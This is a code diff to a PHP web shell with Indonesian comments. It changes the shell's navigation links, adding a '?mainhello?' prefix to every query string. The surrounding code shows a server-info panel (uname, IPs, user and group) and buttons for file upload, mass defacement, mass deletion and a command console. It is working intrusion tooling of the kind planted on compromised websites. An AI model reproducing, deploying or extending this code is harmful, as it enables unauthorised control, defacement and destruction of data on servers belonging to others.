@@ -132,11 +132,11 @@ echo "
 				foreach($paths as $id=>$pat){
 				if($pat == '' && $id == 0){
 					$a = true;
-					echo '<div class="table-responsive"><i class="bi bi-hdd-rack"></i> : <a class="text-decoration-none text-light" href="?path=/">/</a>';
+					echo '<div class="table-responsive"><i class="bi bi-hdd-rack"></i> : <a class="text-decoration-none text-light" href="?mainhello?path=/">/</a>';
 				continue;
 				}
 				if($pat == '') continue;
-					echo '<a class="text-decoration-none" href="?path=';
+					echo '<a class="text-decoration-none" href="?mainhello?path=';
 				for($i=0;$i<=$id;$i++){
 					echo "$paths[$i]";
 				if($i != $id) echo "/";
@@ -157,7 +157,7 @@ echo "
 		<div class='box shadow bg-light p-4 rounded-3'>
 			Uname: <gr>".php_uname()."</gr><br />
 			Software: <gr>".$_SERVER['SERVER_SOFTWARE']."</gr><br />
-			PHP version: <gr>".PHP_VERSION."</gr> <a class='text-decoration-none' href='?phpinfo&path=$path'>[ PHP INFO ]</a> PHP os: <gr>".PHP_OS."</gr><br />
+			PHP version: <gr>".PHP_VERSION."</gr> <a class='text-decoration-none' href='?mainhello?phpinfo&path=$path'>[ PHP INFO ]</a> PHP os: <gr>".PHP_OS."</gr><br />
 			Server Ip: <gr>".gethostbyname($_SERVER['HTTP_HOST'])."</gr><br />
 			Your Ip: <gr>".ip()."</gr><br />
 			User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br />
@@ -167,10 +167,10 @@ echo "
 	</div>
 <div class='text-center'>
 	<div class='btn-group'>
-		<a class='btn btn-outline-light btn-sm' href='?upload&path=$path'><i class='bi bi-upload'></i> upload</a>
-		<a class='btn btn-outline-light btn-sm' href='?mass_deface&path=$path'><i class='bi bi-exclamation-diamond'></i> mass deface</a>
-		<a class='btn btn-outline-light btn-sm' href='?mass_delete&path=$path'><i class='bi bi-trash'></i> mass delete</a>
-		<a class='btn btn-outline-light btn-sm' href='?cmd&path=$path'><i class='bi bi-terminal'></i> console</a>
+		<a class='btn btn-outline-light btn-sm' href='?mainhello?upload&path=$path'><i class='bi bi-upload'></i> upload</a>
+		<a class='btn btn-outline-light btn-sm' href='?mainhello?mass_deface&path=$path'><i class='bi bi-exclamation-diamond'></i> mass deface</a>
+		<a class='btn btn-outline-light btn-sm' href='?mainhello?mass_delete&path=$path'><i class='bi bi-trash'></i> mass delete</a>
+		<a class='btn btn-outline-light btn-sm' href='?mainhello?cmd&path=$path'><i class='bi bi-terminal'></i> console</a>
 	</div>
 </div>";
 // tools nya
@@ -519,10 +519,10 @@ echo '
 </thead>
 <tbody class="text-nowrap">
 <tr>
-	<td><i class="bi bi-folder2-open"></i><a class="text-decoration-none text-secondary" href="?path='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td class="text-center">
+	<td><i class="bi bi-folder2-open"></i><a class="text-decoration-none text-secondary" href="?mainhello?path='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td class="text-center">
 		<div class="btn-group">
-			<a class="btn btn-outline-light btn-sm" href="?filebaru&path='.$dir.'"><i class="bi bi-file-earmark-plus-fill"></i></a>
-			<a class="btn btn-outline-light btn-sm" href="?dirbaru&path='.$dir.'"><i class="bi bi-folder-plus"></i></a>
+			<a class="btn btn-outline-light btn-sm" href="?mainhello?filebaru&path='.$dir.'"><i class="bi bi-file-earmark-plus-fill"></i></a>
+			<a class="btn btn-outline-light btn-sm" href="?mainhello?dirbaru&path='.$dir.'"><i class="bi bi-folder-plus"></i></a>
 		</div>
 	</td>
 </tr>';
